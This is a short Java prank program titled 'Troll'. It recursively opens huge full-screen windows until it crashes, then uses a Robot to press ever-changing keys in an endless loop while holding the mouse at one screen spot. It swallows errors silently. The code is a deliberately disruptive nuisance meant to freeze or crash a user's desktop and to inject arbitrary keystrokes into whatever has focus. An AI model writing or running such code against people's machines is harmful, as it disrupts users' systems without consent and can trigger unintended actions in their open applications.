import javax.swing.JFrame;
import javax.swing.JPanel;
import java.awt.*;
import java.awt.event.*;
class crasherftw extends JPanel{
	public static void main(String[] args){
	try{
		Robot robot=new Robot();
		int key=0;
		crashingftw();
		while(true){
			robot.keyPress(key);
			key++;
			robot.mouseMove(1027,93);
		}
	}catch(Exception e){}
	}
	static void crashingftw(){
		JFrame frame = new JFrame("Troll");
		frame.add(new crasherftw());
		frame.setSize(10000, 10000);
		frame.setVisible(true);
		crashingftw();
	}
}